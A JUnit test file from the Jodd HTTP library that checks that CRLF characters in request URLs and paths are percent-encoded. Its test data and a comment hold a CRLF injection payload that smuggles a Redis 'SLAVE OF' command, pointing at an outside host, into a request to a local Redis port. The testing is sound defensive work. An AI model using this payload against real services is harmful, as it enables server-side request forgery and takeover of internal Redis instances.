package jodd.http;

import jodd.net.URLCoder;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;

class CRLFInjectionTest {

	@Test
	void testGet_crlf_injection() {
		String url = "http://127.0.0.1:6379/ \rfoo";//"HTTP/1.1\r\nHost: 127.0.0.13:1099\r\n\r\nSLAVE OF inhann.top:6379\r\n\r\nPOST / ";
		HttpRequest req = HttpRequest.get(url);

		assertEquals("GET /%20%0Dfoo HTTP/1.1", req.toString().split("\n")[0].trim());
	}

	@Test
	void testGet_crlf_injection_path() {
		String url = "http://127.0.0.1:6379/";
		HttpRequest req = HttpRequest.get(url).path(" \rfoo");

		assertEquals("GET /%20%0Dfoo HTTP/1.1", req.toString().split("\n")[0].trim());
	}

	@Test
	void testGet_crlf_injection2() {
		String path = " HTTP/1.1\n" +
				"Host: 127.0.0.13:1099\n" +
				"\n" +
				"SLAVE OF inhann.top:6379\n" +
				"\n" +
				"POST /";
		String url = "http://127.0.0.1:6379/" + path;
		HttpRequest req = HttpRequest.get(url);

		assertEquals("GET /" + URLCoder.encodePath(path) + " HTTP/1.1", req.toString().split("\n")[0].trim());
	}

}
